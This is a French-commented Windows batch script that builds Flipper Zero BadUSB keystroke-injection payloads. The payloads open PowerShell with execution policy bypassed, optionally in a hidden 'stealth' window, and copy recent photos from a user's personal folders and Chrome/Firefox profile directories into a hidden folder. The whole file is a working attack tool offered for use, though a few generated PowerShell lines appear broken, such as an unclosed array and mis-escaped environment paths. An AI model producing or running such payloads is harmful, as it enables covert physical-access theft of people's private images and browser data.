@echo off
REM ================================================================
REM Générateur de Payload Personnalisé - Flipper Zero BadUSB
REM ================================================================
REM Description: Outil pour créer des payloads personnalisés d'extraction d'images
REM Utilisation: payload_generator.bat
REM Auteur: Plume-Paopedia
REM ================================================================

title Générateur de Payload Personnalisé - Flipper Zero

cls
echo.
echo ╔═══════════════════════════════════════════════════════════════════════╗
echo ║                    GÉNÉRATEUR DE PAYLOAD PERSONNALISÉ                ║
echo ║                         Flipper Zero BadUSB                          ║
echo ╚═══════════════════════════════════════════════════════════════════════╝
echo.

REM Collecte des informations utilisateur
set /p TARGET_NAME="Nom du payload (ex: extract_photos): "
set /p MAX_SIZE="Taille max par fichier en MB (par défaut 50): "
set /p MAX_AGE="Âge max des fichiers en jours (par défaut 90): "
set /p CUSTOM_FOLDER="Nom du dossier de destination (par défaut auto): "
set /p STEALTH_MODE="Mode furtif (o/n, par défaut n): "
set /p INCLUDE_CACHE="Inclure les caches navigateurs (o/n, par défaut o): "

REM Valeurs par défaut
if "%MAX_SIZE%"=="" set MAX_SIZE=50
if "%MAX_AGE%"=="" set MAX_AGE=90
if "%CUSTOM_FOLDER%"=="" set CUSTOM_FOLDER=Extraction_Personnalisee_%%DATE:~-4%%
if "%STEALTH_MODE%"=="" set STEALTH_MODE=n
if "%INCLUDE_CACHE%"=="" set INCLUDE_CACHE=o

echo.
echo Configuration choisie:
echo • Nom: %TARGET_NAME%
echo • Taille max: %MAX_SIZE%MB
echo • Âge max: %MAX_AGE% jours
echo • Dossier: %CUSTOM_FOLDER%
echo • Mode furtif: %STEALTH_MODE%
echo • Caches navigateurs: %INCLUDE_CACHE%
echo.
pause

REM Génération du payload personnalisé
echo Génération du payload en cours...

(
echo REM ================================================================
echo REM Payload Personnalisé - %TARGET_NAME%
echo REM Généré le %DATE% à %TIME%
echo REM ================================================================
echo.
echo DEFAULT_DELAY 300
echo.
echo GUI r
echo DELAY 500
if /i "%STEALTH_MODE%"=="o" (
    echo STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
) else (
    echo STRING cmd
)
echo ENTER
echo DELAY 1000
echo.
if /i "%STEALTH_MODE%"=="n" (
    echo STRING title %TARGET_NAME% - Extraction Personnalisée
    echo ENTER
    echo STRING cd %%USERPROFILE%%\Desktop
    echo ENTER
    echo STRING mkdir %CUSTOM_FOLDER% ^>nul 2^>^&1
    echo ENTER
    echo STRING cd %CUSTOM_FOLDER%
    echo ENTER
    echo DELAY 500
)
echo.
if /i "%STEALTH_MODE%"=="o" (
    echo REM Mode furtif - Script PowerShell compact
    echo STRING ^$path="%%env:USERPROFILE%%\Desktop\.%TARGET_NAME%_temp"; New-Item -ItemType Directory -Path ^$path -Force^|Out-Null; ^$exts=@^("*.jpg","*.png","*.gif","*.bmp"^); ^$locs=@^("%%env:USERPROFILE%%\Pictures","%%env:USERPROFILE%%\Desktop","%%env:USERPROFILE%%\Downloads"^); ^$limit=^(Get-Date^).AddDays^(-%MAX_AGE%^); foreach^(^$loc in ^$locs^){if^(Test-Path ^$loc^){foreach^(^$ext in ^$exts^){Get-ChildItem -Path ^$loc -Filter ^$ext -Recurse -Force -ErrorAction SilentlyContinue ^| Where-Object{^$_.LastWriteTime -gt ^$limit -and ^$_.Length -lt %MAX_SIZE%MB} ^| ForEach-Object{Copy-Item ^$_.FullName -Destination "^$path\^$^(^$_.Directory.Name^)_^$^(^$_.Name^)" -ErrorAction SilentlyContinue}}}};exit
    echo ENTER
) else (
    echo REM Mode normal - Script PowerShell avec interface
    echo STRING powershell.exe -ExecutionPolicy Bypass -WindowStyle Normal -Command "^& {
    echo ENTER
    echo STRING try {
    echo ENTER
    echo STRING   Write-Host 'Début de l extraction personnalisée...' -ForegroundColor Green
    echo ENTER
    echo STRING   ^$dateLimit = ^(Get-Date^).AddDays^(-%MAX_AGE%^)
    echo ENTER
    echo STRING   ^$maxSize = %MAX_SIZE%MB
    echo ENTER
    echo STRING   ^$extensions = @^('*.jpg','*.jpeg','*.png','*.gif','*.bmp','*.webp','*.tiff'
    echo STRING   ^$locations = @^(
    echo ENTER
    echo STRING     '^^env:USERPROFILE\Pictures',
    echo ENTER
    echo STRING     '^^env:USERPROFILE\Desktop', 
    echo ENTER
    echo STRING     '^^env:USERPROFILE\Documents',
    echo ENTER
    echo STRING     '^^env:USERPROFILE\Downloads'
    if /i "%INCLUDE_CACHE%"=="o" (
        echo ENTER
        echo STRING     ,'^^env:LOCALAPPDATA\Google\Chrome\User Data'
        echo ENTER
        echo STRING     ,'^^env:APPDATA\Mozilla\Firefox'
    )
    echo ENTER
    echo STRING   ^)
    echo ENTER
    echo STRING   ^$count = 0
    echo ENTER
    echo STRING   foreach ^(^$location in ^$locations^) {
    echo ENTER
    echo STRING     if ^(Test-Path ^$location^) {
    echo ENTER
    echo STRING       foreach ^(^$ext in ^$extensions^) {
    echo ENTER
    echo STRING         ^$files = Get-ChildItem -Path ^$location -Filter ^$ext -Recurse -ErrorAction SilentlyContinue ^| Where-Object {
    echo ENTER
    echo STRING           ^$_.LastWriteTime -gt ^$dateLimit -and ^$_.Length -lt ^$maxSize -and -not ^$_.PSIsContainer
    echo ENTER
    echo STRING         }
    echo ENTER
    echo STRING         foreach ^(^$file in ^$files^) {
    echo ENTER
    echo STRING           try {
    echo ENTER
    echo STRING             ^$newName = ^$file.Directory.Name + '_' + ^$file.Name
    echo ENTER
    echo STRING             Copy-Item ^$file.FullName -Destination .\^$newName -ErrorAction SilentlyContinue
    echo ENTER
    echo STRING             ^$count++
    echo ENTER
    echo STRING             if ^(^$count %% 10 -eq 0^) { Write-Host ^$count 'images extraites...' -ForegroundColor Cyan }
    echo ENTER
    echo STRING           } catch { }
    echo ENTER
    echo STRING         }
    echo ENTER
    echo STRING       }
    echo ENTER
    echo STRING     }
    echo ENTER
    echo STRING   }
    echo ENTER
    echo STRING   Write-Host 'Extraction terminée: ' ^$count ' images' -ForegroundColor Green
    echo ENTER
    echo STRING } catch {
    echo ENTER
    echo STRING   Write-Host 'Erreur: ' ^$_.Exception.Message -ForegroundColor Red
    echo ENTER
    echo STRING }
    echo ENTER
    echo STRING }"
    echo ENTER
    echo DELAY 2000
    echo.
    echo STRING explorer .
    echo ENTER
    echo STRING pause ^>nul
)
echo.
echo STRING exit
echo ENTER
) > ..\payloads\%TARGET_NAME%.txt

echo.
echo ✅ Payload personnalisé généré avec succès!
echo 📁 Fichier créé: ..\payloads\%TARGET_NAME%.txt
echo.
echo Vous pouvez maintenant utiliser ce payload sur votre Flipper Zero.
echo.
pause